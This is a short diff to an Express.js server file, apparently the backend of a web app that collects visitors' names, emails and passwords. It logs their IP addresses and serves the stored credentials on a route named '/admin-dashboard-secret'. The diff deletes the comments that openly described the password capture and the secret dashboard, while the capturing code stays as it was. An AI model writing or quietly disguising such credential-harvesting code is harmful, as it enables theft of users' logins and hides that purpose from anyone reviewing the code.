@@ -11,7 +11,7 @@ app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
 let visitorLogs = [];
 let ownerMessages = [];
-let visitorCredentials = {}; // Store email & passwords of users
+let visitorCredentials = {};
 let userReplies = {};
 let adminNotices = [];
 let appInstallsCount = 0;
@@ -67,7 +67,6 @@ app.post('/api/track-action', (req, res) => {
     res.json({ success: true });
 });
 
-// Capture and Store Login Credentials (Name, Email, Password)
 app.post('/api/set-credentials', (req, res) => {
     let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';
     if (ip.includes(',')) ip = ip.split(',')[0].trim();
@@ -166,7 +165,7 @@ app.post('/api/admin-stats', (req, res) => {
             time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' }),
             text: newNotice || '',
             mediaType: mediaType || 'text',
- &amp;          mediaData: mediaData || null
+            mediaData: mediaData || null
         });
         return res.json({ success: true, message: "Published successfully!" });
     }
@@ -185,7 +184,6 @@ app.post('/api/admin-stats', (req, res) => {
     });
 });
 
-// Secret Admin Dashboard Route (Shows User Email & Password)
 app.get('/admin-dashboard-secret', (req, res) => {
     res.send(`
         <!DOCTYPE html>
